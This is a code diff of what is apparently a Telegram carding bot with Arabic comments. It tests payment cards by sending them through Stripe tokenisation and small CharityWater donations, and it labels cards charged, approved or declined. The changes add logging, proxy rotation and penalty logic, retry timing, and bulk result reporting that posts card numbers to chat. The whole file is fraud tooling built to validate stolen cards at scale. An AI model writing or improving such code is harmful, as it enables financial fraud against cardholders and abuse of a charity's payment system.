@@ -40,9 +40,14 @@ import logging
 # إعدادات التسجيل
 # ═══════════════════════════════════════
 logging.basicConfig(
-    level=logging.WARNING,  # Changed to WARNING to reduce output
-    format='%(asctime)s - %(levelname)s - %(message)s'
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[logging.StreamHandler(sys.stdout)],   # force stdout → Railway shows it
+    force=True,
 )
+logging.getLogger("urllib3").setLevel(logging.WARNING)
+logging.getLogger("telebot").setLevel(logging.WARNING)
+logging.getLogger("requests").setLevel(logging.WARNING)
 logger = logging.getLogger(__name__)
 
 # ═══════════════════════════════════════
@@ -1072,20 +1077,25 @@ def check_cw_gate(card_str, proxy=None):
         try:
             r1j = r1.json()
         except Exception:
-            return "ERROR", f"Stripe parse error HTTP {r1.status_code}"
+            err = f"Stripe parse error HTTP {r1.status_code}: {r1.text[:120]}"
+            logger.error(f"[CW-Stripe] {cc[:6]}... {err}")
+            return "ERROR", err
 
         if "error" in r1j:
             e = r1j["error"]
             t = e.get("type",""); c_ = e.get("code",""); m_ = e.get("message","")
+            logger.info(f"[CW-Stripe] {cc[:6]}... type={t} code={c_} msg={m_}")
             if t == "card_error" or c_ in ("invalid_number","incorrect_number",
                                             "invalid_expiry_month","invalid_expiry_year",
                                             "expired_card","invalid_cvc"):
                 return "DECLINED", m_
-            return "ERROR", m_
+            return "ERROR", f"Stripe {t}/{c_}: {m_}"
 
         ctoken = r1j.get("id","")
         if not ctoken:
+            logger.error(f"[CW-Stripe] {cc[:6]}... no token in response: {str(r1j)[:120]}")
             return "ERROR", "No confirmation_token"
+        logger.info(f"[CW-Stripe] {cc[:6]}... got token {ctoken[:20]}")
 
         # ── Step 2: CharityWater donate ─────────────────────────────────────
         cw_data = {
@@ -1141,15 +1151,18 @@ def check_cw_gate(card_str, proxy=None):
         try:
             r2j = r2.json()
         except Exception:
+            logger.info(f"[CW-Donate] {cc[:6]}... HTTP {r2.status_code} non-JSON: {r2.text[:120]}")
             if r2.status_code in (200, 201):
                 return "CHARGED", "Donation accepted"
-            return "ERROR", f"CW HTTP {r2.status_code}"
+            return "ERROR", f"CW HTTP {r2.status_code}: {r2.text[:80]}"
+
+        logger.info(f"[CW-Donate] {cc[:6]}... HTTP {r2.status_code} JSON: {str(r2j)[:200]}")
 
         if "error" in r2j:
             msg = r2j["error"].get("message","") or r2j["error"].get("code","")
             low = msg.lower()
             if "insufficient" in low:
-                return "APPROVED", f"Approved (insufficient funds)"
+                return "APPROVED", "Approved (insufficient funds)"
             if any(x in low for x in ["declined","invalid","expired","lost","stolen","blocked"]):
                 return "DECLINED", msg
             return "ERROR", msg
@@ -1157,14 +1170,24 @@ def check_cw_gate(card_str, proxy=None):
         if r2j.get("success") or r2j.get("donation") or r2j.get("id"):
             return "CHARGED", "Donation accepted — Charged!"
 
-        return "ERROR", str(r2j)[:120]
+        return "ERROR", f"Unknown CW response: {str(r2j)[:120]}"
 
-    except requests.exceptions.ProxyError:
-        return "ERROR", "فشل البروكسي"
+    except requests.exceptions.ProxyError as e:
+        logger.warning(f"[CW] {cc[:6]}... ProxyError: {e}")
+        return "ERROR", f"Proxy error: {str(e)[:80]}"
     except requests.exceptions.Timeout:
+        logger.warning(f"[CW] {cc[:6]}... Timeout")
         return "ERROR", "Timeout"
     except Exception as e:
+        logger.error(f"[CW] {cc[:6]}... {type(e).__name__}: {e}")
         return "ERROR", f"{type(e).__name__}: {str(e)[:80]}"
+
+_NETWORK_ERRS = ('timeout', 'connection', 'proxy', 'refused', 'reset', 'eof',
+                 'remotedisconnected', 'ssl', 'name or service not known')
+
+def _is_network_error(reason):
+    r = (reason or '').lower()
+    return any(k in r for k in _NETWORK_ERRS)
 
 def check_cw_with_retry(card_str):
     """Retry CharityWater gate with proxy fallback then direct."""
@@ -1175,16 +1198,26 @@ def check_cw_with_retry(card_str):
         try:
             status, reason = check_cw_gate(card_str, proxy)
         except Exception as e:
-            status, reason = "ERROR", f"{type(e).__name__}: {str(e)[:80]}"
+            status, reason = "ERROR", f"{type(e).__name__}: {str(e)[:120]}"
+
         last_status, last_reason = status, reason
+        logger.info(f"[CW] {card_str[:16]}... attempt {i+1} proxy={bool(proxy)} → {status}: {reason[:80]}")
+
         if status in ("CHARGED", "APPROVED", "DECLINED"):
             if proxy:
                 proxy_pool.report_success(proxy)
             return status, reason
-        if proxy:
+
+        # Only penalize proxy on real network errors, NOT gate application errors
+        if proxy and _is_network_error(reason):
             proxy_pool.report_failure(proxy)
+        elif proxy:
+            # Gate returned an error but proxy itself worked fine
+            proxy_pool.report_success(proxy)
+
         if i < len(attempts) - 1:
-            time.sleep(1)
+            time.sleep(1.5)
+
     return last_status, last_reason
 
 
@@ -2213,12 +2246,29 @@ def check_bulk_ui(cards, chat_id, user_id, gate_id, msg_id):
         push_progress()
 
         # Decide whether to send this result live
-        should_send = is_hit or (send_mode == 'all' and status == 'DECLINED')
+        # Errors always sent in 'all' mode so user can debug what's failing
+        if send_mode == 'hits_only':
+            should_send = is_hit
+        else:  # 'all'
+            should_send = True   # hits + declined + errors (so user sees the problem)
+
         if not should_send:
             return status
 
         if is_cw:
-            msg_text = format_cw_result(status, reason, card, bin_inf)
+            if status == 'ERROR':
+                # For errors show card + reason clearly
+                icon, label = STATUS_LABEL.get('ERROR', ("⚠️", "Error"))
+                msg_text = (
+                    f"{icon} *{label}*\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"𝐂𝐚𝐫𝐝 ➜ `{card}`\n"
+                    f"📄 _{md_escape((reason or 'unknown')[:200])}_\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧"
+                )
+            else:
+                msg_text = format_cw_result(status, reason, card, bin_inf)
         else:
             icon, label = STATUS_LABEL.get(status, ("✅", status))
             msg_text = (
